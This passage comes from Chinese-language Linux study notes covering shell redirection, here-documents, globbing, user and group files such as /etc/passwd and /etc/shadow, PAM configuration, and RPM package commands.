</li></ul></li><li><p>一定要注意：重定向符号不能随意换位置</p><ul><li>cmd &gt; file 2&gt;&amp;1</li><li>cmd 2&gt;&amp;1  &gt;file </li><li>第二句的意思是，先将标准错误输出重定向到1（显示器），然后将标准输出重定向到file，与第一句不同</li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/9.png" style="zoom:50%;" /></li></ul></li></ul><h6 id="7-exec-绑定重定向"><a href="#7-exec-绑定重定向" class="headerlink" title="7. exec 绑定重定向"></a>7. exec 绑定重定向</h6><ul><li><p>格式：<code>exec [n]&lt; file/[n]</code>、<code>exec &gt; file/[n]</code> </p></li><li><p>注意：</p><ul><li>格式： <code>exec [n]&lt;&gt;file</code> </li><li>说明：以读写方式打开file指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。 </li><li>exec仅仅对随后的一条重定向指令有效，第二条向后就失效了</li></ul></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/10.png" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/11.png" style="zoom:80%;" /><h6 id="8-HERE文件"><a href="#8-HERE文件" class="headerlink" title="8.HERE文件"></a>8.HERE文件</h6><ul><li><p>格式：<code>&lt;&lt;[-]EOF</code>，</p></li><li><p>说明：指定shell从当前输入源中读入行直至遇到<strong>仅包含EOF</strong>的一行（EOF后面也不能有空白符），然后所有读入的内容（不包括最后一行）作为标准输入传递给指令。<strong>‘-‘</strong>的作用是将每一行前面的tab去除后再读入。需要注意的是这个<strong>EOF</strong>不会进行任何扩展，但是如果EOF中没有字符没引号扩起来，那么here-document中的内容可以进行参数扩展、指令替换以及算术扩展（parameterexpansion, command substitution, and arithmeticexpansion）；只要有任一字符被引号扩起来，delimiter仍是将去除引号的EOF，但是输入行不会进行任何扩展。</p></li><li><p>示例：</p></li><li><pre class=" language-shell"><code class="language-shell">$ cat <<EOF> $(pwd)     # 指令替换> `pwd`      # 指令替换的第2种形式> $HOME      # 参数扩展> $((4+5))   # 算数扩展> EOF/home/leo        //此处开始扩展/home/leo/home/leo9$ cat <<"EOF"> $(ls)> `pwd`> $HOME> $((4+5))> EOF$(ls)              //因为EOF有双引号，所以不会被扩展`pwd`$HOME$((4+5))</code></pre></li></ul><h6 id="9-HERE字符串"><a href="#9-HERE字符串" class="headerlink" title="9.HERE字符串"></a>9.HERE字符串</h6><ul><li><p>格式：<code>&lt;&lt;&lt;word</code></p></li><li><p>说明：将扩展后的<strong>word</strong>作为标准输入传递给指令。</p><ul><li><p>举例：使用这个功能可以将指令</p><p>echo ‘something’ |command</p><p>通过下面这种方式来实现</p><p>command &lt;&lt;&lt;’something’</p></li></ul></li></ul><h5 id="4-1-3-命令别名：（使用alias定义的别名只在当前shell中生效）"><a href="#4-1-3-命令别名：（使用alias定义的别名只在当前shell中生效）" class="headerlink" title="4.1.3 命令别名：（使用alias定义的别名只在当前shell中生效）"></a>4.1.3 命令别名：（使用alias定义的别名只在当前shell中生效）</h5><ul><li><code>alias</code>： alias  ll=‘ls -l’（等号后不能有空格，等号后用英文单引号、双引号引起来）</li><li><code>unalias</code>：unalias  命令别名</li></ul><h5 id="4-1-4-命令行编辑"><a href="#4-1-4-命令行编辑" class="headerlink" title="4.1.4 命令行编辑"></a>4.1.4 命令行编辑</h5><ul><li><code>Ctrl+a</code>：光标快速跳转到命令行行首</li><li><code>Ctrl+e</code>：光标快速跳转到命令行行尾</li><li><code>Ctrl+u</code>：快速删除光标位置到命令行行首的字符</li><li><code>Ctrl+k</code>：快速删除光标位置到命令行行尾的字符</li><li><code>Ctrl+l</code> ：清屏（clear）</li></ul><h5 id="4-1-5-命令行展开"><a href="#4-1-5-命令行展开" class="headerlink" title="4.1.5 命令行展开"></a>4.1.5 命令行展开</h5><ul><li><p>命令补齐：在path变量中搜索命令并补齐（不能补齐选项）</p></li><li><p>路径和文件补齐：在系统路径中查找</p></li><li><p>命令替换：（常用在编程中）</p><ul><li><p>将命令中的子命令替换成子命令执行结果的过程：$(command)、`commamd `(两边是反撇号)</p></li><li><p><code>&quot; &quot;</code>（双引号）：弱引用（可是实现变量的替换，把变量名替换为变量值）</p></li><li><p>``（反撇号）：命令引用</p></li><li><p><code>‘’</code>（单引号） ：强引用，不会替换</p></li></ul></li></ul><p>#####　4.1.6 命令行通配</p><ul><li>* ：匹配任意长度的任意字符</li><li>?：匹配任意单个字符</li><li>[]：匹配指定范围内的任意字符：[ab][a-z][A-Z][0-9][a-zA-Z][a-zA-Z0-9 ]</li><li><code>[^]：匹配指定范围外的任意字符</code></li><li>[:space:]：代表空格</li><li>[:punct:]：表示所有标点字符</li><li>[:lower:]：表示所有小写字母</li><li>[:upper:]：表示所有大写字母</li><li>[:alpha:]：表示所有字母（包括大小写）</li><li>[:digit:]：表示所有数字</li><li>[:alnum:]：表示所有数字和大小写字母</li></ul><h5 id="4-1-7-变量"><a href="#4-1-7-变量" class="headerlink" title="4.1.7 变量"></a>4.1.7 变量</h5><h5 id="4-1-8-编程"><a href="#4-1-8-编程" class="headerlink" title="4.1.8 编程"></a>4.1.8 编程</h5><h3 id="5-Linux账号与用户组"><a href="#5-Linux账号与用户组" class="headerlink" title="5. Linux账号与用户组"></a>5. Linux账号与用户组</h3><h4 id="5-1-用户管理重要文件的解释"><a href="#5-1-用户管理重要文件的解释" class="headerlink" title="5.1 用户管理重要文件的解释"></a>5.1 用户管理重要文件的解释</h4><h5 id="5-1-1-用户标识符"><a href="#5-1-1-用户标识符" class="headerlink" title="5.1.1 用户标识符"></a>5.1.1 用户标识符</h5><ul><li><p>用户：UID</p></li><li><p>组：GID(逻辑容器：包含用户，实现集中授权)</p></li><li><p>用户分类</p><ul><li>管理员用户：<strong>root  UID：0</strong></li><li>普通用户： 1000-65535</li><li>程序（系统）用户：<strong>1-999</strong></li></ul></li><li><p>组分类</p><p>1.第一种分类方式（按照用户分类）：</p><ul><li><p>管理员组：root</p></li><li><p>基本组：Linux创建新用户时，如果没有指定隶属的组，则系统为用户建立一个同名的用户组</p></li><li><p>附加组：一个用户可以有多个附加组（有效组）</p></li></ul><p>2.第二种分类：</p><ul><li>管理员组：root</li><li>普通用户组：</li><li>系统用户组：</li></ul></li></ul><h5 id="5-1-2-UID-GID解析"><a href="#5-1-2-UID-GID解析" class="headerlink" title="5.1.2 UID/GID解析"></a>5.1.2 UID/GID解析</h5><ul><li><p>识别思路：字符–&gt;解析–&gt;UID/GID</p></li><li><p><code>/etc/passwd</code>：存储用户基本信息</p></li><li><p><code>/etc/shadow</code>：存储用户的影子口令</p></li><li><p><code>/etc/group</code>：存储组的用户信息</p></li></ul><h5 id="5-1-3-etc-passwd-解释"><a href="#5-1-3-etc-passwd-解释" class="headerlink" title="5.1.3 /etc/passwd 解释"></a>5.1.3 /etc/passwd 解释</h5><ul><li>第一列：用户名（name）</li><li>第二列：加密密码（x表示密码占位符，密码保存在/etc/shadow中）</li><li>第三列：UID</li><li>第四列：GID</li><li>第五列：描述信息</li><li>第六列：用户的宿主目录</li><li>第七列：用户默认使用的shell（/etc/shell）</li></ul><h5 id="5-1-4-etc-shadow-解释"><a href="#5-1-4-etc-shadow-解释" class="headerlink" title="5.1.4 /etc/shadow 解释"></a>5.1.4 /etc/shadow 解释</h5><ul><li>第一列：用户的登录名</li><li>第二列：用户加密后的密码</li><li>第三列：最后一次更改密码的时间（时间戳）</li><li>第四列：密码不可以修改的天数</li><li>第五列：密码需要重新修改的天数</li><li>第六列：密码需要修改前的警告天数</li><li>第七列：密码过期后账号宽限时间</li><li>第八列：账号失效日期</li><li>第九列：保留 （暂时没用）</li></ul><h5 id="5-1-5-etc-shadow-密码区域解释"><a href="#5-1-5-etc-shadow-密码区域解释" class="headerlink" title="5.1.5 /etc/shadow 密码区域解释"></a>5.1.5 /etc/shadow 密码区域解释</h5><p>三部分组成：用<strong>$</strong>隔开（格式：<strong>$</strong>id<strong>$</strong>salt<strong>$</strong>encrypted）</p><ul><li>第一部分：加密算法<ul><li>1：md5加密</li><li>5：SHA-256加密</li><li>6：SHA–512加密</li></ul></li><li>第二部分：随机序列号（salt）</li><li>第三部分：随机序列号和设置密码共同加密后的字符串</li></ul><h5 id="5-1-6-etc-group-解释"><a href="#5-1-6-etc-group-解释" class="headerlink" title="5.1.6 /etc/group  解释"></a>5.1.6 /etc/group  解释</h5><ul><li>第一列：组名字</li><li>第二列：组的密码区域</li><li>第三列：组的id号（GID）</li><li>第四列：组的成员（不显示初始化成员）</li></ul><h5 id="5-1-7-etc-gshadow-解释"><a href="#5-1-7-etc-gshadow-解释" class="headerlink" title="5.1.7 /etc/gshadow 解释"></a>5.1.7 /etc/gshadow 解释</h5><ul><li>第一列：组的名字</li><li>第二列：组的密码</li><li>第三列：组的管理员</li><li>第四列：组的成员列表</li></ul><h4 id="5-2-重要的文件"><a href="#5-2-重要的文件" class="headerlink" title="5.2 重要的文件"></a>5.2 重要的文件</h4><h5 id="5-2-1-etc-useradd目录（只对新用户有效）："><a href="#5-2-1-etc-useradd目录（只对新用户有效）：" class="headerlink" title="5.2.1  /etc/useradd目录（只对新用户有效）："></a>5.2.1  /etc/useradd目录（只对新用户有效）：</h5><pre><code># useradd defaults file  //注释行GROUP=100        //可以创建普通组HOME=/home       //普通用户宿主目录（在home下生成和用户同名的目录）INACTIVE=-1      //是否启用用户过期停止使用权（若为数字，则代表过期宽限时间，-1代表不启用）EXPIRE=          //设定过期时间SHELL=/bin/bash  //设定用户默认使用的shellSKEL=/etc/skel   //新用户宿主目录模板目录CREATE_MAIL_SPOOL=yes   //是否为用户启用邮件通知</code></pre><h5 id="5-1-2-etc-skel-目录（用户宿主目录模板目录，只对新建用户生效）："><a href="#5-1-2-etc-skel-目录（用户宿主目录模板目录，只对新建用户生效）：" class="headerlink" title="5.1.2  /etc/skel 目录（用户宿主目录模板目录，只对新建用户生效）："></a>5.1.2  /etc/skel 目录（用户宿主目录模板目录，只对新建用户生效）：</h5><ul><li><p>新用户的目录下必须有这三个文件</p></li><li><p><code>.bash_logout</code>：用户注销时执行的命令</p></li><li><p><code>.bash_profile</code>：用户登录系统时执行的命令（用户变量）</p></li><li><p><code>.bashrc</code>：用户登录一个新shell时执行的命令</p></li></ul><h5 id="5-1-3-etc-login-defs-文件解释：（只对新建用户生效）"><a href="#5-1-3-etc-login-defs-文件解释：（只对新建用户生效）" class="headerlink" title="5.1.3  /etc/login.defs 文件解释：（只对新建用户生效）"></a>5.1.3  /etc/login.defs 文件解释：（只对新建用户生效）</h5><pre><code>- MAIL_DIR                                     /var/spool/mail- PASS_MAX_DAYS            99999            //密码最长使用时间- PASS_MIN_DAYS            0                //密码最短使用时间，0代表不受限制- PASS_MIN_LEN             5                //密码最小长度- PASS_WARN_AGE            7                //密码过期警告时间- UID_MIN                  1000             //普通用户最小UID号- UID_MAX                  60000            //普通用户最大UID号- SYS_UID_MIN              201              //系统用户最小的UID- SYS_UID_MAX              999              //系统用户最大的UID - GID_MIN                  1000             //普通组最小GID- GID_MAX                  60000            //普通组最大UID号- SYS_GID_MIN              201              //系统组最小的UID- SYS_GID_MAX              999              //系统组最大的UID - CREATE_HOME              YES              //是否创建宿主目录- UMASK                    077              //关于权限的反掩码- USERGROUPS_ENAB          YES              //删除用户时是否删除组- ENCRYPY_METHOD           SHA512           //用户密码的加密方式</code></pre><h4 id="5-3-用户管理命令"><a href="#5-3-用户管理命令" class="headerlink" title="5.3 用户管理命令"></a>5.3 用户管理命令</h4><h5 id="5-3-1-useradd：添加新用户（更改-etc-passwd、-etc-group、-etc-shadow）"><a href="#5-3-1-useradd：添加新用户（更改-etc-passwd、-etc-group、-etc-shadow）" class="headerlink" title="5.3.1  useradd：添加新用户（更改/etc/passwd、/etc/group、/etc/shadow）"></a>5.3.1  <code>useradd</code>：添加新用户（更改/etc/passwd、/etc/group、/etc/shadow）</h5><ul><li>语法：<code>useradd [options] user_name</code></li><li>-c：新建用户时，为用户添加描述信息</li><li>-d：指定用户的宿主目录</li><li>-D：查看和修改默认配置（修改/etc/default/useradd文件中的默认值）<ul><li>-g：修改默认的组</li><li>-b：修改默认宿主目录</li><li>-f：修改过期是否停用</li><li>-e：修改过期时间</li><li>-s：修改默认shell</li></ul></li><li>-e：新建用户时，设置过期时间（格式：YYYY-MM-DD）</li><li>-g：指定用户的基本组（没有该选项时，Linux会建立一个同名组作为用户的基本组）</li><li>-G：新建用户时，指定用户的附加组，附加组可以有多个</li><li>-m：创建宿主目录（必须与  -k  一起使用）</li><li>-M：创建用户时，不为用户创建宿主目录</li><li>-p：创建用户时，为用户设置加密的密码（不推荐使用）</li><li>-r：创建系统用户</li><li>-s：指定默认的shell（系统支持的shell）</li><li>-u：指定用户的UID </li><li>手动添加用户需要<ul><li>1.将数据写入/etc/passwd、/etc/shadow、/etc/group</li><li>2.在/home/下建立相应文件夹</li><li>3.将/etc/skel/下的文件复制到/home/用户 /  文件夹下</li></ul></li></ul><h5 id="5-3-2-passwd-：为用户设置密码、锁定解锁用户、查看用户状态"><a href="#5-3-2-passwd-：为用户设置密码、锁定解锁用户、查看用户状态" class="headerlink" title="5.3.2  passwd ：为用户设置密码、锁定解锁用户、查看用户状态"></a>5.3.2  <code>passwd</code> ：为用户设置密码、锁定解锁用户、查看用户状态</h5><ul><li><p>语法：<code>passwd [options] user_name</code> </p></li><li><p>passwd   user_name  ：直接设置密码</p></li><li><p>-l：锁定用户（暂时无法登陆）</p></li><li><p>-u：解锁用户</p></li><li><p>-S：查看用户状态，显示/etc/shadow文件中各个字段的内容</p></li><li><p>–stdin：标准输入，经常在shell脚本编程中为用户自动设置密码</p></li><li><p>-d：删除用户密码，允许普通用户以空密码登陆，仅root用户可以使用</p></li><li><p>-e：快速设置密码过期（用户再次登录时需要修改密码）</p></li><li><p>-n：设置密码最小使用期限</p></li><li><p>-x：设置密码最大使用期限</p></li><li><p>-w：设置密码过期前的警告时间</p></li><li><p>-i：修改密码过期后的宽限时间</p></li><li><p>普通用户设置密码时，先验证当前密码，并且要求符合密码规范</p></li><li><p>root用户设置密码时，不需要验证密码，并且可以不符合密码规范</p></li></ul><h5 id="5-3-3-userdel：删除用户（passwd、shadow、group都修改删除）"><a href="#5-3-3-userdel：删除用户（passwd、shadow、group都修改删除）" class="headerlink" title="5.3.3  userdel：删除用户（passwd、shadow、group都修改删除）"></a>5.3.3  <code>userdel</code>：删除用户（passwd、shadow、group都修改删除）</h5><ul><li><p>语法：<code>userdel [options] user_name</code>  </p></li><li><p>-r ：删除用户时，连同用户的宿主目录一块删除（如果不加，则不删除）</p></li></ul><h5 id="5-3-4-usermod-：修改用户属性（root可以通过vim进行修改）"><a href="#5-3-4-usermod-：修改用户属性（root可以通过vim进行修改）" class="headerlink" title="5.3.4  usermod  ：修改用户属性（root可以通过vim进行修改）"></a>5.3.4  <code>usermod</code>  ：修改用户属性（root可以通过vim进行修改）</h5><ul><li>语法：<code>usermod [options] user_name</code></li><li>-c：更改用户的描述信息</li><li>-d：更改用户的宿主目录</li><li>-e：更改用户的过期时间</li><li>-f：修改/etc/shadow中第七列的内容</li><li>-g：修改用户的基本组</li><li>-G：修改用户的附加组</li><li>-l： 更改用户的登录名（重命名、不修改宿主目录）</li><li>-s：修改用户的shell</li><li>-L：锁定用户</li><li>-U：解锁用户</li></ul><h5 id="5-3-5-chsh-：修改用户的shell"><a href="#5-3-5-chsh-：修改用户的shell" class="headerlink" title="5.3.5  chsh ：修改用户的shell"></a>5.3.5  <code>chsh</code> ：修改用户的shell</h5><ul><li>语法：<code>chsh [options] user_name</code>  </li><li>-s：后面跟shell，更改用户的shell</li><li>-l：显示系统当前支持的shell</li><li>在/etc/目录下添加  nologin.txt 文件，则可以进行提示</li></ul><h5 id="5-3-6-finger-：显示用户的基本信息-需要安装"><a href="#5-3-6-finger-：显示用户的基本信息-需要安装" class="headerlink" title="5.3.6  finger ：显示用户的基本信息(需要安装)"></a>5.3.6  <code>finger</code> ：显示用户的基本信息(需要安装)</h5><ul><li>语法：<code>finger [options] user_name</code>  </li><li>-s、-l、</li></ul><h5 id="5-3-7-chfn-：修改用户的基本信息"><a href="#5-3-7-chfn-：修改用户的基本信息" class="headerlink" title="5.3.7  chfn ：修改用户的基本信息"></a>5.3.7  <code>chfn</code> ：修改用户的基本信息</h5><ul><li>语法：<code>chfn [options] user_name</code></li><li>-o：修改办公室</li><li>-p：修改办公室电话</li><li>-h：修改家庭电话</li></ul><h5 id="5-3-8-id：显示用户和组的ID号"><a href="#5-3-8-id：显示用户和组的ID号" class="headerlink" title="5.3.8  id：显示用户和组的ID号"></a>5.3.8  <code>id</code>：显示用户和组的ID号</h5><ul><li>语法：<code>id [options] user_name</code></li><li>-a：忽略其他版本的区别</li><li>-Z：显示安全上下文的内容（内核）</li><li>-g： 显示有效组号</li><li>-G：显示所有组号（基本组、附加组）</li><li>-n：显示名字（与ugG连用）</li><li>-u ：显示id</li></ul><h5 id="5-3-9-chage：修改用户密码的时间信息"><a href="#5-3-9-chage：修改用户密码的时间信息" class="headerlink" title="5.3.9  chage：修改用户密码的时间信息"></a>5.3.9  <code>chage</code>：修改用户密码的时间信息</h5><ul><li>语法： <code>chage [options] user_name</code></li><li>-l ：列出用户的详细的密码参数</li><li>-d：修改/etc/shadow第三列的内容（后面日期格式：YYYY-MM-DD）</li><li>-E：修改/etc/shadow中第八列的信息，后面跟日期</li><li>-I：修改/etc/shadow中第七列的内容，后面跟天数</li><li>-m：修改/etc/shadow中第四列的内容，后面跟天数</li><li>-M：修改/etc/shadow中第五列的内容，后面跟天数</li><li>-w：修改/etc/shadow中第六列的内容，后面跟天数</li></ul><h4 id="5-4-组管理命令"><a href="#5-4-组管理命令" class="headerlink" title="5.4  组管理命令"></a>5.4  组管理命令</h4><h5 id="5-4-1-groupadd：创建组"><a href="#5-4-1-groupadd：创建组" class="headerlink" title="5.4.1  groupadd：创建组"></a>5.4.1  <code>groupadd</code>：创建组</h5><ul><li>-g：指定组的id</li><li>-r：创建系统组</li></ul><h5 id="5-4-2-groupdel：删除组"><a href="#5-4-2-groupdel：删除组" class="headerlink" title="5.4.2  groupdel：删除组"></a>5.4.2  <code>groupdel</code>：删除组</h5><ul><li>默认情况下不能删除用户的基本组，可以通过修改用户的基本组后删除组，可以删除用户的同时系统删除基本组（该组是一个用户的基本组）</li></ul><h5 id="5-4-3-groupmod-：修改组的属性"><a href="#5-4-3-groupmod-：修改组的属性" class="headerlink" title="5.4.3  groupmod ：修改组的属性"></a>5.4.3  <code>groupmod</code> ：修改组的属性</h5><ul><li>-g：修改组的id号</li><li>-n：重命名</li></ul><h5 id="5-4-4-gpasswd：为组设置密码、管理员、添加成员"><a href="#5-4-4-gpasswd：为组设置密码、管理员、添加成员" class="headerlink" title="5.4.4 gpasswd：为组设置密码、管理员、添加成员"></a>5.4.4 <code>gpasswd</code>：为组设置密码、管理员、添加成员</h5><ul><li>-A：设置组管理员</li><li>-M：批量添加成员</li><li>-r：移除组的密码</li><li>-R：让组的密码失效</li><li>-a：为组添加成员（组管理员的命令）</li><li>-d：删除组成员（组管理员的命令）</li></ul><h5 id="5-4-5-newgrp：为用户修改有效组（只在当前shell生效）"><a href="#5-4-5-newgrp：为用户修改有效组（只在当前shell生效）" class="headerlink" title="5.4.5  newgrp：为用户修改有效组（只在当前shell生效）"></a>5.4.5  <code>newgrp</code>：为用户修改有效组（只在当前shell生效）</h5><ul><li>exit：退出newgroup</li></ul><h5 id="5-4-5-groupmems：为组添加成员，显示组成员列表"><a href="#5-4-5-groupmems：为组添加成员，显示组成员列表" class="headerlink" title="5.4.5  groupmems：为组添加成员，显示组成员列表"></a>5.4.5  <code>groupmems</code>：为组添加成员，显示组成员列表</h5><h3 id="6-认证"><a href="#6-认证" class="headerlink" title="6. 认证"></a>6. 认证</h3><h4 id="6-1-nsswitch：名称解析"><a href="#6-1-nsswitch：名称解析" class="headerlink" title="6.1 nsswitch：名称解析"></a>6.1 <code>nsswitch</code>：名称解析</h4><ul><li><p>认证的中间桥梁，通过libnss库</p></li><li><p>位置：/etc/nsswitch.conf</p></li><li><p>查看so文件的命令：readelf 命令 </p></li><li><p><code>getent hosts www.baidu.com</code>  ：查找百度的解析地址</p></li><li><p><code>getent 文件 内容</code></p></li></ul><h4 id="6-2-PAM-验证"><a href="#6-2-PAM-验证" class="headerlink" title="6.2 PAM 验证"></a>6.2 PAM 验证</h4><h5 id="6-2-1-相关文件"><a href="#6-2-1-相关文件" class="headerlink" title="6.2.1 相关文件"></a>6.2.1 相关文件</h5><ul><li>嵌入式认证模块，PAM 本身不会执行验证，必须执行策略和模块进行验证</li><li><code>ldd</code> 命令 ：查看与服务相关的模块<ul><li><code>ldd  service_path</code> </li></ul></li><li>/etc/pam.d/service_name （系统中支持pam认证的服务名称）</li><li>/etc/pam.d/other （当系统中支持pam认证的服务没有匹配到任何条目时，匹配other中的配置）</li></ul><h5 id="6-2-2-etc-pam-d-service-name格式"><a href="#6-2-2-etc-pam-d-service-name格式" class="headerlink" title="6.2.2  /etc/pam.d/service_name格式"></a>6.2.2  /etc/pam.d/service_name格式</h5><ul><li><p>格式：type   control  modules   [modules_args] </p></li><li><p>type ：</p><ul><li>auth（authentication）：身份验证，匹配用户名密码</li><li>account  ：检查用户名和密码的有效性！有效性</li><li>password ：检查修改密码时，密码是否符合标准</li><li>session ：检查用户会话相关属性</li></ul></li><li><p>control：</p><ul><li>required：一票否决权，继续匹配下面的条目，最后不匹配（保护系统安全性）</li><li>requisite：一票否决权，不继续匹配下面的条目，直接给用户返回结果</li><li>sufficient：一票同意权，不匹配下面的条目，直接给用户返回结果（慎用）</li><li>optional：不影响最终的结果</li><li>include：引用其他的配置文件，把匹配权交给其他配置文件，（如果其他匹配跳出，则整个匹配结束）</li><li>substack：引用其他配置，把匹配权交给其他配置文件（如果其他配置跳出，则仅仅跳出子匹配）</li></ul></li><li><p>modules：匹配认证模块 （value = action）</p><ul><li>value：<ul><li>success、open_err、symbol_err、service_err、 system_err、buf_err、perm_denied、auth_err、cred_insufficient、authinfo_unavail、user_unknown、maxtries、new_authtok_reqd、acct_expired、 session_err、cred_unavail、cred_expired、cred_err、no_module_data、conv_err、 authtok_err、authtok_recover_err、authtok_lock_busy、authtok_disable_aging、 try_again、ignore、abort、authtok_expired、module_unknown、bad_item和default.最后一个(default)能够用来设置上面的返回值无法表达的行为.</li></ul></li><li>action值：<ul><li>ignore:忽略执行结果</li><li>bad:如果失败,结果被用于整个执行栈,后续栈继续执行</li><li>die:和bad相似,但是失败直接返回结果,后续栈不执行</li><li>ok:如果PAM_SUCCESS覆盖之前值</li><li>done:和ok 相似,但是栈直接返回结果 </li><li>reset:重置栈当前状态</li></ul></li><li>部分语法：<ul><li>required  [success=ok new_authtok_reqd=ok ignore=ignore default=bad]</li><li>requisite [success=ok new_authtok_reqd=ok ignore=ignore default=die] </li><li>sufficient [success=done new_authtok_reqd=done default=ignore] </li><li>optional   [success=ok new_authtok_reqd=ok default=ignore] </li></ul></li><li>modules：PAM认证模块相关文件:<ul><li>/etc/pam.d/*:每一个应用程序PAM配置文件</li><li>/usr/lib64/security/*:PAM认证模块文件的实际存放位置</li><li>/etc/security/*:其他PAM环境的配置文件,比如 access.conf</li><li>/usr/share/doc/pam-x:存放详细的PAM的说明文件</li></ul></li></ul></li><li><p>查看应用程序是否支持PAM认证:</p><ul><li>ldd app_path </li><li>如: ldd /usr/sbin/vsftpd  |  grep libpam</li><li>如：ldd `which  httpd`  |  grep  libpam</li></ul></li><li><p>linux-pam 官方文档下载地址： <a href="http://www.linux-pam.org/" target="_blank" rel="noopener">http://www.linux-pam.org/</a> </p></li><li><p>部分pam-*.so文件解释：</p><ul><li>pam_env.so:设置环境变量的模块,如果需要额外的环境变量,可以使用</li><li>pam_env.so进行设置,配置文件/etc/security/pam_env.conf </li><li>pam_unix.so:提供验证阶段的验证功能,也可以提供授权管理</li><li>pam_secruetty.so:限制系统管理员只能够从安全的终端登录,安全终端:/etc/securetty</li><li>pam_nologin.so:限制普通使用者能否登录主机进行使用,当/etc/nologin文件存在时,所有的普通用户都无法登录</li><li>pam_cracklib.so:可是限制恶意攻击,检查密码强度</li><li>pam_pwquality.so:完全兼容pam_cracklib.so,检查密码强度,包括设置的密码是否在字典</li><li>pam_limits.so:限制使用者打开文件数量,单个文件大小</li><li>pam_rootok.so:如果UID为0,直接通过,如root用户su到普通用户使用此模</li><li>pam_listfile.so:验证使用其他的文件</li><li>pam_access.so:控制访问的模块,默认配置/etc/security/access.conf: ALL EXCEPT gooann:ALL</li></ul></li></ul><h3 id="7-软件包管理：RPM-Redhat-Package-Manager"><a href="#7-软件包管理：RPM-Redhat-Package-Manager" class="headerlink" title="7. 软件包管理：RPM(Redhat Package Manager)"></a>7. 软件包管理：RPM(Redhat Package Manager)</h3><h4 id="7-1-应用程序"><a href="#7-1-应用程序" class="headerlink" title="7.1 应用程序"></a>7.1 应用程序</h4><p><strong>源代码 —— 编译 ——  链接 —— 运行</strong></p><ul><li><p>应用程序：具有执行权限的就是。与CPU架构密不可分</p></li><li><p>编译：生成二进制文件（可执行文件），匹配底层架构</p></li><li><p>链接：</p><ul><li>库：静态库和动态库   .so  （shared object）<ul><li>静态链接过程：把库文件集成到应用程序中</li><li>动态链接过程：库文件与应用程序分开，做链接，运行时调用</li></ul></li></ul></li></ul><p>程序 = 数据 + 指令        应用程序运行时，申请CPU和内存资源</p><p>应用程序中包含的内容:</p><ul><li>二进制文件(可执行程序)（/bin、/ sbin、/usr/bin、/usr/ sbin）</li><li>库（/usr/lib）</li><li>配置文件（/etc）</li><li>帮助文件（/usr/share/）</li></ul><h4 id="7-2-内存地址空间"><a href="#7-2-内存地址空间" class="headerlink" title="7.2 内存地址空间"></a>7.2 内存地址空间</h4><ul><li>text：存放指令</li><li>data+bss：data存放数据，bss： block  system of symbol 存放初始化为0的变量</li><li>堆：heap存放运行中临时文件</li><li>栈：存放应用程序的变量和函数等</li></ul><h4 id="7-3-软件安装——RPM"><a href="#7-3-软件安装——RPM" class="headerlink" title="7.3 软件安装——RPM"></a>7.3 软件安装——RPM</h4><p>Redhat ，SUSE：RPM</p><p>Debian ，Ubuntu：dpt</p><p>前端工具：yum   apt-get    （自行解决依赖关系）</p><p>后端工具：RPM  dpt    （不能自行解决依赖关系）</p><h5 id="7-3-1-RPM的优点"><a href="#7-3-1-RPM的优点" class="headerlink" title="7.3.1 RPM的优点"></a>7.3.1 RPM的优点</h5><ul><li>RPM软件包中包含了编译过的程序与配置文件，用户不需要重新编译</li><li>RPM在安装之前，首先会检查硬盘容量，操作系统版本等，避免被错误安装</li><li>RPM使用RPM<strong>数据库</strong>管理（<strong>/var/lib/rpm</strong>），数据中记录应用程序的参数，便于升级，卸载，查询等</li><li>RPM本身会提供应用程序版本信息，相关属性，软件名称，用途等。便于用户了解软件</li></ul><h5 id="7-3-2-RPM包的组成"><a href="#7-3-2-RPM包的组成" class="headerlink" title="7.3.2 RPM包的组成"></a>7.3.2 RPM包的组成</h5><p>RPM命名：</p><ul><li><p>包：组成部分</p><ul><li>主包：yum-3.4.3-150.e17.centos.noarch.rpm</li><li>子包：yum-langpacks-0.4.2-7.e17.noarch.rpm</li></ul></li><li><p>包名格式：</p><ul><li>name-version-release.arch.rpm   (noarch代表任何架构都可以使用)</li></ul></li><li><p>其中的version：</p><ul><li>主版本号：功能重大改进则改进主版本号</li><li>次版本号：某个子功能发生重大变化</li><li>发行号：修正了部分bug，调整了一点功能</li></ul></li></ul><p>RPM的功能：安装、查询、卸载、升级、校验、数据库重建、验证数据包</p><p>两种类型的包：</p><ul><li><p>RPM包：经过源代码编译后的软件包</p></li><li><p>.tar.gz：源码包，没有经过编译</p></li></ul><p>RPM的命令： </p><ol><li><strong>安装</strong>： <code>rpm -ivh  name.rpm</code></li></ol><ul><li>-i   ：安装</li><li>-h   ：打印50个#号显示进度条</li><li>-v   ：显示更详细的信息</li><li>–nodeps：忽略依赖关系，可能导致软件包安装不完整</li><li>–replacepkgs ：重新安装，替换原有安装；</li><li>–force：强行安装，可以实现重装或降级；</li></ul><ol start="2"><li><strong>查询</strong>：<code>RPM -q  PACKAGE_NAME</code>: 查询指定的包是否已经安装</li></ol><ul><li>-qa ：查询已经安装的所有包</li><li>-qi  PACKAGE_NAME：查询指定包的说明信息;</li><li>-ql  PACKAGE_NAME：询指定包安装后生成的文件列表;</li><li>-qc PACEAGE_NEME：查询指定包安装的配置文件;</li><li>-qd PACKAGE_NAME：查询指定包安装的帮助文件;</li><li>-qf   /path/to/somefile：查询指定的文件是由哪个rpm包安装生成的;</li><li>-q –scripts PACKAGE_NAME：查询指定包中包含的脚本<ul><li>脚本：包含软件包安装前(preinstall)，安装后(postinstall)，卸载前(preuninstall)，卸载后(postuninstall)执行的脚本</li></ul></li></ul><ol start="3"><li><strong>未安装前查询</strong></li></ol><p>如果某rpm包尚未安装，我们需查询其说明信息、安装以后会生成的文件：</p><ul><li><p>rpm  -qpi  /path/to/package_name  查看未安装软件包信息</p></li><li><p>rpm  -qpl  /path/to/package_name  查看未安装软件包 安装的列表</p></li></ul><ol start="4"><li><strong>升级</strong></li></ol><ul><li>-Uvh  /PATH/TO/NEW_PACKAGE_FILE：如果装有老版本的，则升级；否则，则安装;</li><li>-Fvh  / PATH/TO/NEW_PACKAGE_FILE：如果装有老版本的，则升级；否则，退出;</li><li>-Uvh  – oldpackage  PACKAGE_NAME：降级</li></ul><ol start="5"><li><strong>卸载</strong></li></ol><ul><li>rpm -e  PACKAGE_NAME  [– nodeps：忽略依赖关系]</li></ul><ol start="6"><li><strong>校验</strong>：验证软件包列表或配置文件的完整性</li></ol><ul><li><p>rpm -V  PACKAGE_NAME </p><p>  